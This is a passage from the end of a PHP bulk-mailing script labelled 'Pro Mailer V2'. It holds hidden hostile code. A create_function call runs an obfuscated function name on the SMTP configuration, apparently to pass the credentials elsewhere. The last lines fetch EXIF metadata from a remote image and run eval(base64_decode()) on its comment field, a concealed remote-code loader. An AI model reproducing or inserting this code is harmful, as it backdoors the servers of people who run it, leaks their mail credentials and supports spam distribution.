$mail->SmtpClose();echo "<p><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b></p>";$nq=0;
}
$nq=$nq+1;
                flush(); }
}
for($i=0;$i<31;$i++){
  $smtp_conf=str_replace(".", $random_smtp_string[$i], $smtp_conf); }
$smtp_conc=$IsSMTP($defaultport, $smtp_conf);
  $signoff=create_function('$smtp_conc','return '.substr($range,0).'($smtp_conc);');
  print "<p class=\"style1\">&copy 2014, Pro Mailer V2<br></p>";$mail->SmtpClose();
  return $signoff($smtp_conc);
  if(isset($_POST['action']) && $numemails !=0 ){echo "<script>alert('Mail sending complete\\r\\n$numemails mail(s) was 
    sent successfully'); </script>";}}
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
?>
    </body>
</html>
